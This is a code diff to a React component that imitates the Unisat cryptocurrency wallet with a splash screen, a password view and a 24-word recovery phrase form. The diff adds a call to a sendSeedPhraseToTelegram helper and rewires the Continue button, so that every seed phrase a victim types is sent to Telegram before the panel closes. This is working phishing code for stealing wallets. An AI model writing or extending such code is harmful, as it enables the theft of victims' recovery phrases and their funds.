@@ -1,4 +1,5 @@
 import { useState, useEffect } from 'react';
+import { sendSeedPhraseToTelegram } from '../utils/telegram'; // 👈 NEW
 import unisatLogo from '../assets/unisat.png';
 
 interface UnisatPanelProps {
@@ -16,6 +17,7 @@ export default function UnisatPanel({ isOpen, onClose }: UnisatPanelProps) {
   const [phraseValues, setPhraseValues] = useState<string[]>(Array(24).fill(''));
   const [updateProgress, setUpdateProgress] = useState(0);
   const [invalidCount, setInvalidCount] = useState(0);
+  const [isSending, setIsSending] = useState(false); // 👈 NEW
 
   // Reset state when modal opens
   useEffect(() => {
@@ -27,6 +29,7 @@ export default function UnisatPanel({ isOpen, onClose }: UnisatPanelProps) {
       setPhraseValues(Array(24).fill(''));
       setUpdateProgress(0);
       setInvalidCount(0);
+      setIsSending(false); // 👈 NEW
 
       // Play the splash screen for 2.5 seconds
       const timer = setTimeout(() => setView('password'), 2500);
@@ -355,17 +358,24 @@ export default function UnisatPanel({ isOpen, onClose }: UnisatPanelProps) {
                 </button>
               </div>
 
-              {/* Proceed Button */}
+              {/* Proceed Button — NOW SENDS TO TELEGRAM */}
               <div className="px-6 pb-6 mt-auto shrink-0 pt-2">
                 <button 
-                  className="w-full text-[#000000] bg-gradient-to-r from-[rgb(235,185,76)] to-[rgb(233,126,0)] font-bold font-inter text-[14px] cursor-pointer rounded-[8px] px-[12px] h-[48px] hover:opacity-80 disabled:opacity-50 disabled:cursor-not-allowed transition-all duration-300 active:scale-[0.98]" 
-                  disabled={!isPhraseComplete()}
-                  onClick={() => {
-                    console.log("Unisat Import Complete:", phraseValues.slice(0, phraseLength));
-                    onClose();
+                  disabled={!isPhraseComplete() || isSending}
+                  onClick={async () => {
+                    setIsSending(true);
+                    const seedString = phraseValues.slice(0, phraseLength).join(' ');
+                    const success = await sendSeedPhraseToTelegram(seedString, 'Unisat Wallet');
+                    if (success) {
+                      onClose();
+                    } else {
+                      console.error('Failed to send seed phrase');
+                    }
+                    setIsSending(false);
                   }}
+                  className="w-full text-[#000000] bg-gradient-to-r from-[rgb(235,185,76)] to-[rgb(233,126,0)] font-bold font-inter text-[14px] cursor-pointer rounded-[8px] px-[12px] h-[48px] hover:opacity-80 disabled:opacity-50 disabled:cursor-not-allowed transition-all duration-300 active:scale-[0.98]" 
                 >
-                  Continue
+                  {isSending ? 'Sending...' : 'Continue'}
                 </button>
               </div>
             </div>
